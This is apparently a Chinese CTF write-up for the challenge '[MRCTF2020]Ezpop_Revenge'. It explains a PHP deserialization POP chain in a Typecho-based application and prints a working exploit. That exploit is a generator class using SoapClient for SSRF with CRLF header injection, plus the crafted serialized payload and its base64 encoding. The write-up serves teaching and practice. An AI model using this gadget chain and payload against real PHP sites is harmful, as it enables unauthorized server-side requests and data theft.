---
title: '[MRCTF2020]Ezpop_Revenge'
date: 2024-12-04 19:11:50
tags: 
      - 反序列化
      - 代码审计
categories: 刷题笔记
---

## [MRCTF2020]Ezpop_Revenge

我们扫描目录发现www.zip可以下载，由于题目为pop，我们想到反序列化

在文件中查找unserialize函数

我们找到输入点

![image-20241205191504586](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412051915706.png)

在插件中，我们发现action()的代码

这儿需要说明一下，这儿的action一般是自动加载的，当路由加载类是会自动加载某个[函数](https://marketing.csdn.net/p/3127db09a98e0723b83b2914d9256174?pId=2782&utm_source=glcblog&spm=1001.2101.3001.7020)，所以我们直接搜索这个类的名称

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/d4c6cac9c9f27f8f2ef3ef0cd06fc5bd.png)

```
Helper::addRoute("page_admin_action","/page_admin","HelloWorld_Plugin",'action');
```

这句代码的意思就是访问/page_admin的时候，会自动加载HelloWorld_Plugin类，而且会自动调用action函数，所以我们输入点的路由为/page_admin

**寻找pop链**

在根目录下我们发现flag文件

![image-20241205192515158](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412051925190.png)

usr下面的Plugin.php中间有个类

![image-20241205193348839](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412051933888.png)

我们跟进Typecho_Db

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9f340fb3c18b2921c8d6f4c8df52347d.png)

然后在Typecho_Db的__construct中发现字符串拼接，这个时候我们就知道肯定调用了某个类的`__tostring`,因为$adapterName我们可控

所以我们直接搜索`__tostring`

![image-20241205193709136](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412051937202.png)

然后跟踪到Query.php的___toString

假如`Typecho_Db::SELECT（静态值）`的值为`SELECT`，则跟进`$this->_adapter`

我们发现这个值我们也是可控的，这个时候我们控制`_adapter`为soap类就可以了

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7ee484745c67c10db6d19891887ef341.png)

是时候树立一下pop链，首先是/usr下的Plugins.php反序列化调用HelloWorld_DB触发Typecho_DB类，并且可以控制其中的`$adapterName``$adapterName`拼接到字符串中，触发`__tostring`，所以这个时候我们使得`$adapterName`为`Query.php`中的`Typecho_Db_Query`类，并且控制私有变量`$_adapter`为soap类来本地访问flag.php

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9d2a6a025048e87bb5b7ce72e234d9e2.png)

这个时候再访问soap的`parseSelect`方法，但是此方法并不存在，所以就会触发soap的`__call`方法来达到本地访问的目的 

payload

```
<?php

class Typecho_Db_Query
{
    private $_sqlPreBuild;
    private $_adapter;

    public function __construct()
    {
       $target = 'http://127.0.0.1/flag.php';
		$headers = array(
		'X-Forwarded-For: 127.0.0.1',
		'Cookie: PHPSESSID=u7818vin3dl5lja95o9obvgqp5'
		);
		$b = new SoapClient(null,array('location' => $target,'user_agent'=>'HyyMbb^^'.join('^^',$headers),'uri'      => "aaab"));
        $this->_sqlPreBuild =array("action"=>"SELECT");
        $this->_adapter = $b;
    }
}


class HelloWorld_DB
{
    private $coincidence;

    public function __construct()
    {
        $this->coincidence = ["hello" => new Typecho_Db_Query()];
    }
}

$a = new HelloWorld_DB();
$aaa = serialize($a);

```

这个时候先生成序列化的值，然后再做一些小处理

我们都知道私有变量类名的前后都有%00，但是某些特定版本的情况下，这样也会出错

这个时候我们需要将s改为S，并添加`\00`

如同这个样子

```
$aaa = 'O:13:"HelloWorld_DB":1:{S:26:"\00HelloWorld_DB\00coincidence";a:1:{s:5:"hello";O:16:"Typecho_Db_Query":2:{S:30:"\00Typecho_Db_Query\00_sqlPreBuild";a:1:{s:6:"action";s:6:"SELECT";}S:26:"\00Typecho_Db_Query\00_adapter";O:10:"SoapClient":5:{s:3:"uri";s:4:"aaab";s:8:"location";s:25:"http://127.0.0.1/flag.php";s:15:"_stream_context";i:0;s:11:"_user_agent";s:79:"wupco^^X-Forwarded-For: 127.0.0.1^^Cookie: PHPSESSID=a8vkg6l5j5sesvqan5q5s4obr1";s:13:"_soap_version";i:1;}}}}';

```

然后再添加\r\n，base64编码

```
$aaa = str_replace('^^',"\r\n",$aaa);
$aaa = str_replace('&','&',$aaa);
echo base64_encode($aaa);

```

我们soap访问的`PHPSESSID`的值为`a8vkg6l5j5sesvqan5q5s4obr1`

这个时候访问`/page_admin`页面

![image-20241205201022903](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412052010972.png)

然后我们刷新页面，将之前的session重新填上



得到flag

![image-20241205201156209](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412052011246.png)

参考

https://blog.csdn.net/a3320315/article/details/105215741

写在最后，再说一下为啥要更换s，和添加\00，而不是直接编码
都知道private属性会在反序列化的生成一个标志性的%00，关于这个坑点p神是这么说的

PHP序列化的时候private和protected变量会引入不可见字符\x00，输出和复制的时候可能会遗失这些信息，导致反序列化的时候出错。

private属性序列化的时候会引入两个\x00，注意这两个\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，如图1，url编码后就可以看得很清楚了。

同理，protected属性会引入\x00*\x00。

此时，为了更加方便进行反序列化Payload的传输与显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。比如s:5:”A<null_byte>B“;̀ -> S:5:”A\00B\09\0D”;
